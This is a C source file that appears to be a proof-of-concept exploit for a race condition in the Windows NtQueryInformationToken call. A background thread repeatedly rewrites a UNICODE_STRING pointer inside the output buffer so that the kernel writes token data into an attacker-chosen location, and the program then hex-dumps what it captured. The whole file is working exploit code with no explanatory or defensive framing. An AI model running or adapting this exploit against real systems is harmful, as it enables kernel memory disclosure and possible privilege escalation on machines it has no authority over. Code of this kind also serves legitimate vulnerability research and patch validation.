#include <windows.h>
#include <stdio.h>
#include <winternl.h>

#pragma comment(lib, "advapi32.lib")
#define BUFFERSIZE 0x1000

typedef NTSTATUS(WINAPI* PFN_NT_QUERY_INFORMATION_TOKEN)(
    HANDLE TokenHandle,
    TOKEN_INFORMATION_CLASS TokenInformationClass,
    PVOID TokenInformation,
    ULONG TokenInformationLength,
    PULONG ReturnLength
);

unsigned char Temp[0x20] = { 0, };

int is_printable_ascii(unsigned char c) {
    return c >= 0x20 && c <= 0x7E;
}

void print_hex(unsigned char *mem, unsigned int size) {
    for (unsigned int i = 0; i < size; i += 16) {
        unsigned int line_size = (size - i < 16) ? size - i : 16;

        printf("%p  ", mem + i);

        for (unsigned int j = 0; j < 16; j++) {
            if (j < line_size)
                printf("%02x ", mem[i + j]);
            else
                printf("   ");
        }

        printf(" ");

        for (unsigned int j = 0; j < line_size; j++) {
            unsigned char c = mem[i + j];
            printf("%c", is_printable_ascii(c) ? c : '.');
        }

        printf("\n");
    }
}


DWORD modify(LPVOID TargetAddr) {
    while (1) {
        ((UNICODE_STRING *)TargetAddr)->Buffer = (PWSTR)Temp;
    }
}

void race(void *TargetAddr) {
    HANDLE hThread;
    DWORD dwThreadId;
    hThread = CreateThread(
        NULL,
        0,
        modify,
        TargetAddr,
        0,
        &dwThreadId
    );
}

int main() {
    HANDLE hToken = NULL;
    unsigned char *TokenInformation = NULL;
    LPSTR pSidString = NULL;
    NTSTATUS status;
    DWORD dwReturnLength = 0;

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll == NULL) {
        printf("Failed to get handle to ntdll.dll. Error: %lu\n", GetLastError());
        return 1;
    }

    PFN_NT_QUERY_INFORMATION_TOKEN NtQueryInformationToken =
        (PFN_NT_QUERY_INFORMATION_TOKEN)GetProcAddress(hNtdll, "NtQueryInformationToken");

    if (NtQueryInformationToken == NULL) {
        printf("Failed to get address of NtQueryInformationToken. Error: %lu\n", GetLastError());
        return 1;
    }

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken)) {
        printf("OpenProcessToken failed. Error: %lu\n", GetLastError());
        return 1;
    }
    printf("Successfully opened process token.\n");

    TokenInformation = malloc(BUFFERSIZE);

    if (TokenInformation == NULL) {
        printf("Memory allocation failed.\n");
        CloseHandle(hToken);
        return 1;
    }
    memset(TokenInformation, 0, BUFFERSIZE);
    
    printf("TokenInformation: %p\n", TokenInformation);
    printf("Target: %p\n", TokenInformation + 0x5e0);
    UNICODE_STRING *TargetAddr = (UNICODE_STRING *)(TokenInformation+0x5e0);

    race(TargetAddr);

    while (1) {
        NtQueryInformationToken(hToken, TokenAccessInformation, TokenInformation, BUFFERSIZE, &dwReturnLength);
        if (Temp[0] == 'T' && Temp[2] == 'S' && Temp[4] == 'A') {
            break;
        }
    }

    print_hex(Temp, TargetAddr->Length);
    free(TokenInformation);
    CloseHandle(hToken);
    return 0;
}